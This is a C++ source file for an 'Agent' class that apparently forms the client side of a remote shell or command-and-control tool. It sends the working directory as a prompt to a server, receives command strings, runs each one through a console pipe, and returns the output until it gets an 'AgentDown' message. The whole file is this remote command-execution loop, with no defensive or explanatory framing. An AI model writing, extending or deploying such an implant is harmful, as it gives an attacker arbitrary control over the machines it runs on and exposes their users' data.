#include "Agent.h"

void Agent::OnConnect(Connection connection)
{
	Packet packet;
	std::filesystem::path path = std::filesystem::current_path();

	packet.InsertString(path.string() + ">");
	connection.Send(packet);
}


bool Agent::ShutDown()
{
	if (not connSocket.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}
	
	return true;
}

bool Agent::Logic()
{
	Packet packet;
	
	if (not serverConn.Recv(packet))
	{
		std::cerr << "Agent::Logic::Recv Error." << std::endl;
		return false;
	}

	std::string msg = packet.ExtractString();

	if (msg == "AgentDown\n")
	{
		std::cout << "[+] Shutting down agent..." << std::endl;
		return false;
	}

	console.InitializePromptPipe();
	console.ExecCommand(msg);
	
	std::string cmdOutput = console.GetCmdOutput();

	packet.Clear();
	packet.InsertString(cmdOutput);

	if (not serverConn.Send(packet))
	{
		std::cerr << "Agent::Logic::Send Error." << std::endl;
		return false;
	}

	return true;
}
